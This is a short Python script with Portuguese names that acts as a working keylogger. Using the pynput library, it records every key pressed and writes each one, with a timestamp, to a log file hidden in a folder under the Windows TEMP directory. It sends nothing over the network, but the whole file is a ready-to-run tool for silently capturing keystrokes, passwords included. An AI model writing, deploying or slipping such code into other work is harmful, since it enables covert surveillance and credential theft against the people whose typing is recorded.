from pynput.keyboard import Key, Listener
import logging
import os

diretorio_log = os.path.join(os.getenv('TEMP'), 'Pasta')
if not os.path.exists(diretorio_log):
    os.makedirs(diretorio_log)

arquivo_log = os.path.join(diretorio_log, 'registro.txt')
logging.basicConfig(filename=arquivo_log, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def pressinona(tecla):
    logging.info(str(tecla))


if __name__ == '__main__':
    with Listener(on_press=pressinona) as ouvinte:
        ouvinte.join()              
        